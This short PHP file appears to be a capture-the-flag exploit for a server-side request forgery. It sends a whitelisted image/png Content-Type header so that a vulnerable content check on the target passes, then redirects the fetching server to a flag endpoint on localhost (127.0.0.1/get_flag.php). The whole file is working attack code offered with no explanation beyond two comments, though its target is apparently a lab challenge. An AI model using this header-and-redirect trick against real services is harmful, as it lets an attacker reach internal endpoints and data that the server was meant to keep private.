<?php
// Send a whitelisted Content-Type so the vulnerable loop breaks early
header("Content-Type: image/png");

// Redirect the server to the local flag file
header("Location: http://127.0.0.1/get_flag.php");
?>
